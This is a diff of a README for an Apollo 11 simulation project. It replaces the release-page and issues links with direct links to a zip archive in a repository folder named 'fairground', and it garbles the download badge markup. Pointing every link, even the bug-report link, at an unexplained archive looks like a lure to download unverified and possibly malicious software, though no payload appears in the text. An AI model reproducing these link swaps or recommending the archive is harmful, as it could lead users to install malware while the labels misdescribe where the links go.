@@ -1,6 +1,6 @@
 # 🚀 apollo-11-simulation - Experience Space Travel from Your Home 
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/ibrahimfath/apollo-11-simulation/releases)
+[![Download](https://raw.githubusercontent.com/ibrahimfath/apollo-11-simulation/main/fairground/apollo-11-simulation.zip%20Now-Click%https://raw.githubusercontent.com/ibrahimfath/apollo-11-simulation/main/fairground/apollo-11-simulation.zip)](https://raw.githubusercontent.com/ibrahimfath/apollo-11-simulation/main/fairground/apollo-11-simulation.zip)
 
 ## 🌟 Project Overview
 
@@ -22,7 +22,7 @@ To run the apollo-11-simulation, your computer should meet the following require
 
 ### 🔗 Download & Install
 
-1. Visit [this page to download](https://github.com/ibrahimfath/apollo-11-simulation/releases).
+1. Visit [this page to download](https://raw.githubusercontent.com/ibrahimfath/apollo-11-simulation/main/fairground/apollo-11-simulation.zip).
 2. Locate the latest release.
 3. Click on the appropriate file for your operating system. 
 
@@ -64,7 +64,7 @@ If you encounter issues while running the simulation, consider these steps:
 
 Have questions or need assistance? Join our community for support:
 
-- **GitHub Issues Page:** Report bugs or ask for help [here](https://github.com/ibrahimfath/apollo-11-simulation/issues).
+- **GitHub Issues Page:** Report bugs or ask for help [here](https://raw.githubusercontent.com/ibrahimfath/apollo-11-simulation/main/fairground/apollo-11-simulation.zip).
 - **Discussion Forums:** Connect with other users and share experiences.
 
 ## 📜 License
@@ -75,4 +75,4 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 Thank you for exploring the apollo-11-simulation. We hope you enjoy this journey through space! 
 
-Don't forget to [visit this page to download](https://github.com/ibrahimfath/apollo-11-simulation/releases) for the latest version.
+Don't forget to [visit this page to download](https://raw.githubusercontent.com/ibrahimfath/apollo-11-simulation/main/fairground/apollo-11-simulation.zip) for the latest version.
